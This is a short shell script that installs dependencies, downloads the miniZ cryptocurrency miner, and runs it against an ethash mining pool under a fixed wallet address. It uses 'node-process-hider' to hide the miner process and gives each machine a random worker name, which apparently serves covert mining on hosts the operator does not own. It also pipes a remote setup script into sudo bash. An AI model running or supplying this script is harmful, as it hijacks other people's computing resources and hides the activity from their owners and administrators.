apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8z2/miniZ_v1.8z2_linux-x64.tar.gz

tar xf miniZ_v1.8z2_linux-x64.tar.gz

ph add miniZ

./miniZ -u 17anS59W98wRb5HvtvPocGCD5oKYwMHHzh.$(echo $(shuf -i 1-999 -n 1)-an) -l us-eth.2miners.com --port=2020 --intensity=85 -p x --par=ethash
